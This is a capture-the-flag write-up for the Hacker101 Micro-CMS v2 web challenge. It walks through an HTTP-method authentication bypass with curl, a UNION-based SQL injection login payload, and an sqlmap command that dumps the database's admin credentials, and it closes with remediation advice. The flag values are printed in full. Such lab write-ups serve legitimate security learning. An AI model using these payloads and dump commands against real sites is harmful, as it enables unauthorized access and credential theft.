# Micro-CMS v2 - Web Security Challenge Writeup

**Difficulty:** Easy  
**Category:** Web Security  
**Flags:** 3/3  
**Platform:** Hacker101 CTF

---

## 🎯 Challenge Overview

Micro-CMS v2 is an enhanced version of the previous CMS challenge, featuring improved security measures that require more sophisticated exploitation techniques. This challenge focuses on HTTP method manipulation, advanced SQL injection, and automated vulnerability scanning.

---

## 📋 Initial Reconnaissance

After reading the challenge introduction, I discovered that the application requires admin authentication to edit pages. Unlike the previous version, this CMS implements proper access controls that redirect unauthenticated users to a login page.

**Key Observations:**
- Admin login required for page editing
- Enhanced security measures compared to v1
- Traditional SQL injection approaches initially unsuccessful

---

## 🚩 Flag 1: HTTP Method Manipulation

### Understanding HTTP Methods

Before diving into the exploitation, it's important to understand the different HTTP methods:

| Method | Purpose | Typical Use Case |
|--------|---------|------------------|
| **GET** | Retrieve data | Fetching web pages, API data |
| **POST** | Submit data | Form submissions, creating resources |
| **PUT** | Update/create resource | Updating existing data |
| **DELETE** | Remove resource | Deleting data |
| **PATCH** | Partial update | Modifying specific fields |

### Discovery Process

I started by testing different HTTP methods on the page edit endpoint to see how the server responds to each request type.

### Exploitation

Using `curl`, I systematically tested each HTTP method:

#### PUT Request
```bash
curl -X PUT https://4eaf579a76255142ee4a5e79d0455be4.ctf.hacker101.com/page/edit/2
```

**Response:**
```html
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

**Analysis:** The server explicitly rejects PUT requests with a 405 status code, indicating this method is not supported for this endpoint.

#### GET Request
```bash
curl -X GET https://4eaf579a76255142ee4a5e79d0455be4.ctf.hacker101.com/page/edit/2
```

**Response:**
```html
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

**Analysis:** GET requests trigger the authentication mechanism, redirecting unauthenticated users to the login page.

#### POST Request
```bash
curl -X POST https://4eaf579a76255142ee4a5e79d0455be4.ctf.hacker101.com/page/edit/2
```

**Response:**
```
^FLAG^9973127ac2dc004f7523694acc1c46172bc942c515cec014943d5f69773ce62e$FLAG$
```

**Analysis:** The POST request bypassed the authentication check! This suggests the application only validates authentication for GET requests but not for POST requests to the same endpoint.

### 🏁 First Flag Captured
```
^FLAG^9973127ac2dc004f7523694acc1c46172bc942c515cec014943d5f69773ce62e$FLAG$
```

**Vulnerability:** Inconsistent authentication enforcement across HTTP methods.

---

## 🚩 Flag 2: Advanced SQL Injection - Authentication Bypass

### Understanding UNION-Based SQL Injection

The UNION SELECT technique allows attackers to combine results from multiple queries. Here's how it works:

```sql
-- Normal query (simplified)
SELECT username, password FROM users WHERE username = 'input'

-- Injection payload
' UNION SELECT '123' AS password#

-- Resulting query
SELECT username, password FROM users WHERE username = '' UNION SELECT '123' AS password#'
```

**Key Components:**
- `'` - Closes the original query string
- `UNION SELECT` - Combines results from two queries
- `'123' AS password` - Creates a fake password column with value '123'
- `#` - Comments out the rest of the original query (MySQL syntax)

### Exploitation Process

After researching authentication bypass techniques, I discovered that the login form was vulnerable to UNION-based SQL injection.

**Payload Used:**
- **Username:** `' UNION SELECT '123' AS password#`
- **Password:** `123`

**How It Works:**
1. The injection closes the original username query
2. UNION SELECT creates a new result set with password '123'
3. The application accepts this fake credential set
4. Login succeeds with password '123'

### Accessing Restricted Content

After successfully bypassing authentication, I gained access to the admin panel.

![PrivateFlag](PrivateFlag.png)
*Successfully logged in and accessing previously forbidden page 3*

I navigated to the previously forbidden `/page/edit/3` endpoint and discovered the second flag embedded in the page content.

### 🏁 Second Flag Captured
```
^FLAG^cb72b1fdf1d8022037410a03a8015b20b370840474bd32314d409378088a0bb6$FLAG$
```

**Vulnerability:** SQL injection in authentication mechanism allowing complete bypass.

---

## 🚩 Flag 3: Automated SQL Injection with SQLMap

### Understanding SQLMap Parameters

SQLMap is a powerful automated SQL injection tool. Here's a breakdown of the command used:

```bash
sqlmap -u https://4eaf579a76255142ee4a5e79d0455be4.ctf.hacker101.com/login \
       --data "username=abc&password=xyz" \
       -p username \
       --dbms=mysql \
       --dump \
       --threads 10
```

**Parameter Breakdown:**

| Parameter | Purpose | Explanation |
|-----------|---------|-------------|
| `-u` | Target URL | Specifies the vulnerable endpoint |
| `--data` | POST data | Defines the form parameters to test |
| `-p username` | Parameter to test | Focuses testing on the username parameter |
| `--dbms=mysql` | Database type | Optimizes payloads for MySQL database |
| `--dump` | Extract data | Downloads all discoverable database content |
| `--threads 10` | Concurrency | Uses 10 parallel threads for faster execution |

### Automated Exploitation

SQLMap automatically detected and exploited the SQL injection vulnerability, then proceeded to dump the entire database structure and contents.

### Database Discovery

The tool successfully extracted the admin credentials table:

```csv
id,password,username
1,paulina,mariko
```

**Analysis:**
- **Username:** `mariko`
- **Password:** `paulina`
- These are the legitimate admin credentials stored in the database

### 🏁 Third Flag Captured
```
^FLAG^d9dcb4242ec8c65b84f35754ffce7ab9e646f0d776dbb87d2cf33e7fafebf765$FLAG$
```

**Vulnerability:** Complete database compromise through automated SQL injection.

---

## 📊 Vulnerability Summary

| Vulnerability | Severity | Impact | Remediation |
|---------------|----------|---------|-------------|
| **HTTP Method Authentication Bypass** | High | Unauthorized access to admin functions | Implement consistent authentication across all HTTP methods |
| **SQL Injection in Login** | Critical | Complete authentication bypass | Use parameterized queries and input validation |
| **Database Information Disclosure** | Critical | Full database compromise | Implement proper error handling and database security |

---

## 🛡️ Security Recommendations

### Immediate Fixes
1. **Method-Agnostic Authentication**
   ```python
   # Ensure all HTTP methods check authentication
   @require_auth
   def edit_page(request, page_id):
       # Handle both GET and POST with same auth requirements
   ```

2. **Parameterized Queries**
   ```python
   # Instead of string concatenation
   query = "SELECT * FROM users WHERE username = ?"
   cursor.execute(query, (username,))
   ```

3. **Input Validation**
   ```python
   # Validate and sanitize all user inputs
   username = sanitize_input(request.form['username'])
   ```

### Long-term Security Measures
- Implement Web Application Firewall (WAF)
- Regular security audits and penetration testing
- Database access controls and monitoring
- Security headers implementation
- Rate limiting for login attempts

---

## 🎓 Key Learning Points

1. **HTTP Method Security**: Always implement consistent security controls across all HTTP methods
2. **SQL Injection Prevention**: Never trust user input; always use parameterized queries
3. **Defense in Depth**: Multiple security layers prevent single points of failure
4. **Automated Testing**: Tools like SQLMap can quickly identify vulnerabilities that manual testing might miss
5. **Authentication vs Authorization**: Proper implementation of both is crucial for application security

---

## 🔧 Tools and Techniques Used

- **Manual Testing**: curl for HTTP method manipulation
- **SQL Injection**: UNION-based authentication bypass
- **Automated Scanning**: SQLMap for comprehensive database extraction
- **Reconnaissance**: Systematic approach to identifying attack vectors

---

## 🏆 Challenge Completion

- **Total Flags:** 3/3 ✅
- **Difficulty Rating:** Easy ⭐⭐
- **Key Skills Demonstrated:** 
  - HTTP protocol manipulation
  - Advanced SQL injection techniques
  - Automated vulnerability assessment
  - Database security analysis

This challenge provided excellent hands-on experience with both manual and automated web application security testing techniques, demonstrating the importance of comprehensive security controls in web applications.